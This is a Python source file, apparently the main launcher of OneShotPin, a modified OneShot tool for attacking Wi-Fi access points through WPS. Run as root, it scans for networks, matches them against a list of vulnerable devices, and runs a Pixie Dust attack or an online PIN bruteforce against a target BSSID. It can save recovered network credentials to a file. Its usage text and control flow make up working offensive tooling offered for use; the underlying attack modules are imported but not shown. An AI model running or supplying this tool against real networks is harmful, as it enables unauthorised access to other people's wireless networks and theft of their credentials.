#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys

from pathlib import Path

import src.wifi.android
import src.wifi.scanner
import src.wps.connection
import src.utils
import src.args

class Companion:
    """Main application part"""

    def __init__(self):
        pixiewps_dir = src.utils.PIXIEWPS_DIR
        sessions_dir = src.utils.SESSIONS_DIR

        if not os.path.exists(sessions_dir):
            os.makedirs(sessions_dir)

        if not os.path.exists(pixiewps_dir):
            os.makedirs(pixiewps_dir)

def usage():
    return """
OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg

%(prog)s <arguments>

Required arguments:
    -i, --interface=<wlan0>  : Name of the interface to use

Optional arguments:
    -b, --bssid=<mac>        : BSSID of the target AP
    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
    -K, --pixie-dust         : Run Pixie Dust attack
    -B, --bruteforce         : Run online bruteforce attack
    --push-button-connect    : Run WPS push button connection

Advanced arguments:
    -d, --delay=<n>          : Set the delay between pin attempts [0]
    -w, --write              : Write AP credentials to the file on success
    -s, --save               : Save the AP to network manager on success
    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
    -X, --show-pixie-cmd     : Always print Pixiewps command
    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
    --iface-down             : Down network interface when the work is finished
    -l, --loop               : Run in a loop
    -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
    --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                               (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
    -v, --verbose            : Verbose output

Example:
    %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
"""

if __name__ == '__main__':
    args = src.args.parseArgs()

    if sys.hexversion < 0x030800F0:
        src.utils.die('The program requires Python 3.8 and above')
    if os.getuid() != 0:
        src.utils.die('Run it as root')

    if args.mtk_wifi:
        wmtWifi_device = Path('/dev/wmtWifi')

        if not wmtWifi_device.is_char_device():
            src.utils.die('Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): '
                '/dev/wmtWifi does not exist or it is not a character device')

        wmtWifi_device.chmod(0o644)
        wmtWifi_device.write_text('1')

    if not src.utils.ifaceUp(args.interface):
        src.utils.die(f'Unable to up interface \'{args.interface}\'')

    while True:
        try:
            android_network = src.wifi.android.AndroidNetwork()

            connection = src.wps.connection.Initaliaze(
                args.interface, args.write, args.save, print_debug=args.verbose
            )

            if src.utils.isAndroid is True:
                print('[*] Detected Android OS - temporarily disabling network settings')
                android_network.storeAlwaysScanState()
                android_network.disableWifi()

            if args.pbc:
                connection.singleConnection(pbc_mode=True)
            else:
                if not args.bssid:
                    try:
                        with open(args.vuln_list, 'r', encoding='utf-8') as file:
                            vuln_list = file.read().splitlines()
                    except FileNotFoundError:
                        vuln_list = []

                    scanner = src.wifi.scanner.WiFiScanner(args.interface, vuln_list)
                    if not args.loop:
                        print('[*] BSSID not specified (--bssid) — scanning for available networks')
                    args.bssid = scanner.promptNetwork()

                if args.bssid:
                    if args.bruteforce:
                        connection.smartBruteforce(args.bssid, args.pin, args.delay)
                    else:
                        connection.singleConnection(args.bssid, args.pin, args.pixie_dust, args.show_pixie_cmd, args.pixie_force)
            if not args.loop:
                break
            else:
                args.bssid = None
        except KeyboardInterrupt:
            if args.loop:
                if input('\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ').lower() == 'y':
                    print('Aborting…')
                    break
                else:
                    args.bssid = None
            else:
                print('\nAborting…')
                break
        finally:
            if src.utils.isAndroid is True:
                android_network.enableWifi()

    if args.iface_down:
        src.utils.ifaceUp(args.interface, down=True)

    if args.mtk_wifi:
        wmtWifi_device.write_text('0')
